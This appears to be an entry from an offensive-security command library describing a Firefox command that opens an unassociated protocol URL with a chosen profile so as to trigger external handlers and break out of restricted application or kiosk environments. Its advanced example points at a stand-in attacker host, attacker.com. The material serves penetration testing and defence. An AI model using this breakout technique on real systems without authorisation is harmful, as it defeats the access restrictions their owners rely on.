---
id: e4fb66ca-d8cb-4c22-bcac-9b90ddb3ad51
name: firefox-open-irc-with-test-profile
type: command
executor: bash
data: 'firefox irc://127.0.0.1 -P "Test"'
output: null
created_at: '2023-04-06T03:56:17.501365+00:00'
updated_at: '2023-04-06T03:56:17.513906+00:00'
platforms:
  - Windows
tags:
  - protocol-handling
  - firefox
  - breakout
verified: true
validated: true
---

# firefox-open-irc-with-test-profile

## Command

```bash
firefox irc://127.0.0.1 -P "Test"
```

## Description

This command launches Firefox using a specific profile ('Test') and opens an IRC protocol URL, which can trigger external handlers for unassociated protocols, facilitating application escape scenarios.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| irc://127.0.0.1 | The unassociated protocol URL to open (replace with target scheme/IP) | Yes |
| -P | Flag to specify the profile name | Yes |
| "Test" | Name of the existing profile to use | Yes |

## Examples

### Basic Usage

```bash
firefox irc://127.0.0.1 -P "Test"
```

### Advanced Usage

```bash
firefox customproto://attacker.com:8080 -P "AttackProfile"
```

## Expected Output

Firefox starts with the specified profile and attempts to load the URL. For unassociated protocols, it may show a warning/prompt or invoke an external app. Console may show no errors; visually, browser window opens to a blank or error page, with potential OS-level handler activity.

## Related

- [[commands/firefox-create-test-profile]]
- [[procedures/Application-Escape-and-Breakout-via-Unassociated-Protocols-in-Firefox]]
